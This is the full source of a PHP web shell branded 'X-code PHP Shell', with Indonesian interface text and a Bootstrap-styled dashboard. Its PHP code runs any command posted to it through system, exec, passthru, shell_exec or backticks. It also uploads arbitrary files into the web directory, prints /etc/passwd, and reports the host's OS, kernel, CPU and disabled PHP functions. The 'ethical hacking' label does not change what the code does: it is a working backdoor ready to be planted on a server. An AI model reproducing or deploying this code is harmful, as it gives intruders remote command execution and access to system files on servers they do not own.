<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <!-- This file has been downloaded from Bootsnipp.com. Enjoy! -->
    <title>X-code PHP Shell</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.0/css/bootstrap.min.css" rel="stylesheet">
    <style type="text/css">
        body{background-color: #262626;}

.navbar-inverse {
    background-color: #2C3E50;
    border-color: #2C3E50;
}

.navbar {
    position: relative;
    min-height: 50px;
    margin-bottom: 0px;
    border: 0px solid transparent;
}
.navbar-nav > li > a {
    padding-top: 20px;
    padding-bottom: 10px;
    line-height: 20px;
}
@media (min-width: 768px){

.navbar {
    border-radius: 0px;
}}

.navbar-brand {
    float: left;
    height: auto;
    padding: 15px 15px;
    font-size: 18px;
    line-height: 20px;
}
.sidebar-toggle {
    color: #fff;
    font-size: 28px;
    display: inline-block;
    padding: 3px 22px;
}
@media (min-width:768px){
.container-1{width:15%;float:left;}
.container-2{width:100%;float: left;}
}

@media (max-width:768px){
.container-1{width:100%;}
.container-2{width:100%;}
}
.container-1:after,
.container-2:before,
{
  display: table;
  content: " ";
}
.container-1:after,
.container-2:after,
{clear: both;}

.container-1{display: none;}
/*navbar-right=====START==========*/

.social-icon{margin:0px;padding:0px;}
.social-icon li {margin: 0px;padding: 0px;list-style-type: none;}
.social-icon li a {
    display: block;
    padding: 15px 14px;
    text-decoration:none;
}
.social-icon li a:focus{
   color:#fff;
    text-decoration:none;
}

.messages-link{
        color: #fff !important;
    background: #16a085 !important;

}

.alerts-link{
        color: #fff !important;
    background: #f39c12 !important;

}

.tasks-link{
        color: #fff !important;
    background: #2980b9 !important;

}

.user-link{
        color: #fff !important;
    background: #E74C3C !important;

}
 .number {
    position: absolute;
    bottom: 25px;
    left: 3px;
    width: 20px;
    height: 20px;
    padding-right: 1px;
    border-radius: 50%;
    text-align: center;
    font-size: 11px;
    line-height: 20px;
    background-color: #2c3e50;
}

.dropdown-menu {
    position: absolute;
    top: 100%;
    left: -105px;
    z-index: 1000;
    display: none;
    float: left;
    min-width: 160px;
    padding: 5px 0;
    margin: 2px 0 0;
    font-size: 14px;
    text-align: left;
    list-style: none;
    background-color: #fff;
    -webkit-background-clip: padding-box;
    background-clip: padding-box;
    border: 1px solid #ccc;
    border: 1px solid rgba(0, 0, 0, .15);
    border-radius: 4px;
    -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, .175);
    box-shadow: 0 6px 12px rgba(0, 0, 0, .175);
}
/*navbar-right=======END========*/

/*sidebar-toggle=============*/
.sidebar-toggle:hover, .sidebar-toggle:focus {
    color: #fff;
    text-decoration: underline;
}


/*sidr-NAVBAR=======START========*/
.navbar-nav-1{width: 100%;background-color:#34495E;height:auto;overflow: hidden;z-index: 1020;position: relative;}

.side-user {
    display: block;
    width: 100%;
    padding: 15px;
    border-top: none !important;
    border-bottom: 1px solid #142638;
    text-align: center;
}
.close-btn {
    position: absolute;
    z-index: 99;
    color: #fff;
    font-size: 31px;
    top: 0px;
    left: 223px;    
    display: none;
    padding: 0px;
    cursor: pointer;
}
.close-btn .fa-window-close{color:#fff;font-size: 25px;}
.welcome {
    margin: 0;
    font-style: italic;
    color: #9aa4af;
}

.name {
    margin: 0;
    font-family: "Ubuntu","Helvetica Neue",Helvetica,Arial,sans-serif;
    font-size: 20px;
    font-weight: 300;
    color: #ccd1d7;
}
.side-user a{
   color:#fff;
}
.nav-search{border-top: 1px solid #54677a;}
.nav-search .form-control{border: 1px solid #000;border-radius: 0px;}
.nav-search .btn{border: 1px solid #000;border-radius: 0px;}

.dashboard>a{
    color:#fff;
    }
.side-nav li {
    border-top: 1px solid #54677a;
    border-bottom: 1px solid #142638;
}

.side-nav>li>a:active {
    text-shadow: 1px 1px 1px rgba(0,0,0,0.1);
    outline: none;
    color: #fff;
    background-color: #34495e;
}

.panel {
    margin-bottom: 0;
    border: none;
    border-radius: 0;
    background-color: transparent;
    box-shadow: none;
}

.panel>a{
    position: relative;
    display: block;
    padding: 10px 15px;
    color: #fff;
}

.panel>ul>li>a {
    position: relative;
    display: block;
    padding: 10px 15px;
    color: darkcyan;
    background: black;
}
.nav > li > a:hover, .nav > li > a:focus {
    text-decoration: none;
    background-color: #3d566e;
}
/*sidr-NAVBAR=======END========*/
@media (min-width: 768px){

#page-wrapper {
   
    padding: 0 30px;
    min-height: 1300px;
    border-left: 1px solid #2c3e50;
}
}

#page-wrapper {
    padding: 0 15px;
    border: none;
    
}

.date-picker{    
    border-color: #138871;
    color: #fff;
    background-color: #149077;
    margin-top: -7px;
    border-radius: 0px;
    margin-right: -15px;
}

#page-wrapper .breadcrumb {
    padding: 8px 15px;
    margin-bottom: 20px;
    list-style: none;
    background-color: #e0e7e8;
    border-radius: 0px;
    
}




@media (min-width: 768px){
.circle-tile {
    margin-bottom: 30px;
}
}

.circle-tile {
    margin-bottom: 15px;
    text-align: center;
}

.circle-tile-heading {
    position: relative;
    width: 80px;
    height: 80px;
    margin: 0 auto -40px;
    border: 3px solid rgba(255,255,255,0.3);
    border-radius: 100%;
    color: #fff;
    transition: all ease-in-out .3s;
}

/* -- Background Helper Classes */

/* Use these to cuztomize the background color of a div. These are used along with tiles, or any other div you want to customize. */

 .dark-blue {
    background-color: #34495e;
}

.green {
    background-color: #16a085;
}

.blue {
    background-color: #2980b9;
}

.orange {
    background-color: #f39c12;
}

.red {
    background-color: #e74c3c;
}

.purple {
    background-color: #8e44ad;
}

.dark-gray {
    background-color: #7f8c8d;
}

.gray {
    background-color: #95a5a6;
}

.light-gray {
    background-color: #bdc3c7;
}

.yellow {
    background-color: #f1c40f;
}

/* -- Text Color Helper Classes */

 .text-dark-blue {
    color: #34495e;
}

.text-green {
    color: #16a085;
}

.text-blue {
    color: #2980b9;
}

.text-orange {
    color: #f39c12;
}

.text-red {
    color: #e74c3c;
}

.text-purple {
    color: #8e44ad;
}

.text-faded {
    color: rgba(255,255,255,0.7);
}



.circle-tile-heading .fa {
    line-height: 80px;
}

.circle-tile-content {
    padding-top: 50px;
}
.circle-tile-description {
    text-transform: uppercase;
}

.text-faded {
    color: rgba(255,255,255,0.7);
}

.circle-tile-number {
    padding: 5px 0 15px;
    font-size: 26px;
    font-weight: 700;
    line-height: 1;
}

.circle-tile-footer {
    display: block;
    padding: 5px;
    color: rgba(255,255,255,0.5);
    background-color: rgba(0,0,0,0.1);
    transition: all ease-in-out .3s;
}

.circle-tile-footer:hover {
    text-decoration: none;
    color: rgba(255,255,255,0.5);
    background-color: rgba(0,0,0,0.2);
}


.morning {
    background: url(https://lh3.googleusercontent.com/-1YbV7nsVnX8/WMugaq-6BEI/AAAAAAAADSg/0wPfQ84vMUcCle_SkgiUDOumUKscMaA8QCL0B/w530-d-h353-p-rw/widget-bg-morning.jpg) center bottom no-repeat;
    background-size: cover;
}

.time-widget {
    margin-top: 5px;
    overflow: hidden;
    text-align: center;
    font-size: 1.75em;
}

.time-widget-heading {
    text-transform: uppercase;
    font-size: .5em;
    font-weight: 400;
    color: #fff;
}
#datetime{color:#fff;}
.tile-img {
    text-shadow: 2px 2px 3px rgba(0,0,0,0.9);
}

.tile {
    margin-bottom: 15px;
    padding: 15px;
    overflow: hidden;
    color: #fff;
}
    </style>
    <script src="http://code.jquery.com/jquery-1.11.1.min.js"></script>
    <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
    <script src="https://use.fontawesome.com/07b0ce5d10.js"></script>
</head>
<?php
#BANK FUNGSI
function xcode($cmd) {  
if(function_exists('system')) {     
    @ob_start();    
    @system($cmd);    
    $buff = @ob_get_contents();     
    @ob_end_clean();    
    return $buff;   
  } elseif(function_exists('exec')) {     
    @exec($cmd,$results);     
    $buff = "";     
    foreach($results as $result) {      
      $buff .= $result;     
    } return $buff;   
  } elseif(function_exists('passthru')) {     
    @ob_start();    
    @passthru($cmd);    
    $buff = @ob_get_contents();     
    @ob_end_clean();    
    return $buff;   
  } elseif(function_exists('shell_exec')) {     
    $buff = @shell_exec($cmd);    
    return $buff;   
  } 
}

$df = strtolower(@ini_get("disable_functions"));
$sm = strtolower(@ini_get("safe_mode"));
?>
<body>
<!--top nav start=======-->
<nav class="navbar navbar-inverse top-navbar" id="top-nav">
  <div class="container-fluid">
    <div class="navbar-header">      
      <a class="navbar-brand" href="<?php echo $_SERVER['PHP_SELF'];?>"><img class="img-responsive" src="https://xcode.or.id/04_small-logo.png" width="150" height="20"></a>
    </div>    
    <ul class="social-icon pull-right list-inline">   
       <li class="dropdown">
          <a class="messages-link dropdown-toggle" href="<?php echo $_SERVER['PHP_SELF'];?>?home"><span class="fa fa-home"></span> Home</a>
        </li>       
        <li class="dropdown">
          <a class="messages-link dropdown-toggle" href="<?php echo $_SERVER['PHP_SELF'];?>?shell"><span class="fa fa-database"></span> Shell</a>
        </li>
        <li class="dropdown">
          <a class="messages-link dropdown-toggle" href="<?php echo $_SERVER['PHP_SELF'];?>?inject"><span class="fa fa-upload"></span> Upload</a>
        </li>
        <li class="dropdown">
          <a class="messages-link dropdown-toggle" href="<?php echo $_SERVER['PHP_SELF'];?>?cekuser"><span class="fa fa-user-secret"></span> Cek User</a>
        </li>
      </ul> 
    </div>  
</nav>    
<!--    top nav end===========-->
    
    <!-- begin SIDE NAV USER PANEL -->     
    <div class="container-2">
     <div id="page-wrapper">   
      <div class="row">
     <div class="col-md-12">
      <div class="page-title">
        <ol class="breadcrumb">
         <li class="active"><i class="fa fa-dashboard"></i> Selamat datang, <?php echo xcode('uname -n');?> di X-code PHP Shell v0.2 Bootstrap Edition <small> For Ethicial Hacking</small></li>
          <li class="pull-right">
           <div id="reportrange" class="btn btn-green btn-square date-picker">
            <i class="fa fa-calendar"></i>
             <span class="date-range"><?php echo date('l jS \of F Y h:i:s A');?></span>
           </div>
          </li>
        </ol>
       </div>
      </div>
     </div> 

  <div class="row">
     <div class="col-md-12">
      <div class="card card-primary card-outline">
        <div class="card-body box-profile">
          <div class="text-center">
            <img class="profile-user-img img-fluid img-square" src="https://camo.githubusercontent.com/7677d5854ed80ca9d724e1050bbe57d861f575e5/687474703a2f2f78636f64657365727665722e6d792e69642f676f666f6f642e706e67" alt="Donasi Gopay Kurniawan">
          </div>
           <h3 class="profile-username text-center">X-code PHP Shell v0.2 Bootstrap Edition</h3>
           <p class="text-muted text-center">For Ethicial Hacking</p>
          </div>
          <!-- /.card-body -->
        </div>
        <!-- /.card -->  
      </div>
   </div> 

   <div class="row">
     <div class="col-md-12">
       <?php
       if(isset($_GET['home'])) { 
       ?>
       <div class="page-title">
           <ol class="breadcrumb">
            <li class=""><i class="fa fa-desktop"></i> OS: <?php echo xcode('uname -s');?> | Kernel: <?php echo xcode('uname -r');?> | Release: <?php echo xcode('uname -v');?> | Machine: <?php echo xcode('uname -m');?> | Hostname: <?php echo xcode('uname -n');?></li>
           </ol>

           <ol class="breadcrumb">
            <li class=""><i class="fa fa-linux"></i> <?php echo xcode('lsb_release -i');?> | <?php echo xcode('lsb_release -d');?> | <?php echo xcode('lsb_release -r');?> | <?php echo xcode('lsb_release -c');?> </li>
           </ol>

           <ol class="breadcrumb">
            <li class=""><i class="fa fa-linux"></i> <?php echo xcode('php -v');?> </li>
           </ol>

           <ol class="breadcrumb">
            <li class=""><i class="fa fa-linux"></i> <?php echo xcode('lscpu');?> </li>
           </ol>

           <ol class="breadcrumb">
            <li class=""><i class="fa fa-linux"></i> <?php echo xcode('free');?> </li>
           </ol>

           <ol class="breadcrumb">
            <li class=""><i class="fa fa-info"></i> <?php echo ($sm) ? "Safemode: <span class='btn btn-success'>Running</span>" : "Safemode: <span class='btn btn-danger'>Stopped</span>"?> </li>
           </ol>

           <ol class="breadcrumb">
            <li class=""><i class="fa fa-info"></i> <?php echo (!empty($df)) ? "Disable Functions: <textarea class='form-control' rows='2' cols='200' placeholder='$df'></textarea>" : "Safemode: <span class='btn btn-danger'>Stopped</span>"?> </li>
           </ol>


       </div>
        <?php
      }elseif(isset($_GET['shell'])) { 
          if(isset($_POST['x'])) {
        ?>
       <div class="card card-primary card-outline">
        <div class="card-body box-profile">
          <h3 class="profile-username text-center">Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home </h3>
          <form action="" method="POST">
        <ul class="list-group list-group-unbordered mb-12">
          <li class="list-group-item">
              <input class="form-control" type="text" name="x" value="ls -l">
          </li>
          <li class="list-group-item">
              <input type="submit" class="btn btn-primary btn-block" value="Execute">
          </li>
        </ul>
        </form>
        <pre>
        <?= `{$_POST['x']};` ?> </pre> <? die(); ?>
        <?php 
         } else {
        ?>
        <h3 class="profile-username text-center">Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home </h3>
        <form action="" method="POST">
        <ul class="list-group list-group-unbordered mb-12">
          <li class="list-group-item">
              <input class="form-control" type="text" name="x" value="ls -l">
          </li>
          <li class="list-group-item">
              <input type="submit" class="btn btn-primary btn-block" value="Execute">
          </li>
        </ul>
        </form>
        <?php
           }
           }elseif (isset($_GET['inject'])) {
        ?>
        <div class="card card-primary card-outline">
        <div class="card-body box-profile">
        <?php
         if(isset($_POST['cekfile'])) {
         move_uploaded_file($_FILES["file"]["tmp_name"],"".$_FILES["file"]["name"]);
         ?>
         <ul class="list-group list-group-unbordered mb-12">
          <li class="list-group-item">
               <b>Upload Berhasil!</b>
          </li>
        </ul>
         <?php
         } else {
        ?>
        <form enctype="multipart/form-data" action="" method="POST">
        <ul class="list-group list-group-unbordered mb-12">
          <li class="list-group-item">
              <input class="form-control" type="file" name="file">
          </li>
          <li class="list-group-item">
              <input type="submit" name="cekfile" class="btn btn-primary btn-block" value="Upload">
          </li>
        </ul>
        </form>
        <?php
        } 
        ?>
        <?php
           }elseif (isset($_GET['cekuser'])) {
        ?>
        <div class="card card-primary card-outline">
        <div class="card-body box-profile">
        <ul class="list-group list-group-unbordered mb-12">
          <li class="list-group-item">
            <b>Anda sedang membuka file PASSWD</b>
          </li>
          <li class="list-group-item">
            <pre><?php echo xcode('cat /etc/passwd'); ?></pre>
          </li>
        </ul>
        <?php
           }
        ?>
      </div>
     </div>
    </div>
  </div> 
   <div class="row">
     <div class="col-md-12">
      <div class="card card-primary card-outline">
        <div class="card-body box-profile">
           <h3 class="profile-username text-center">Create with <i class="fa fa-heart"></i> Kurniawan X-code</h3>
           <p class="text-muted text-center">Template Sumit Kumar | AdminLTE | Recode by Anas NightKidz</p>
          </div>
          <!-- /.card-body -->
        </div>
        <!-- /.card -->  
      </div>
   </div> 
</div><!-- page-wrapper END-->
</div><!-- container-1 END-->
<script type="text/javascript">

</script>
</body>
</html>
